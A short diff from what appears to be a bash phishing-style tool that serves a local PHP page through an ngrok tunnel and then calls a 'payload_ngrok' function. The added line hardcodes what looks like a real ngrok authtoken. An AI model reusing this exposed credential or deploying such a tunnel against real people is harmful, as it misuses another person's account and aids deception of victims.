@@ -228,6 +228,7 @@ php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
+./ngrok authtoken 25oW5QZFCbbNVN2UBxBDBcULOtN_57Jzz7VZTcdVTh4rU2gpt
 sleep 10
 
 payload_ngrok
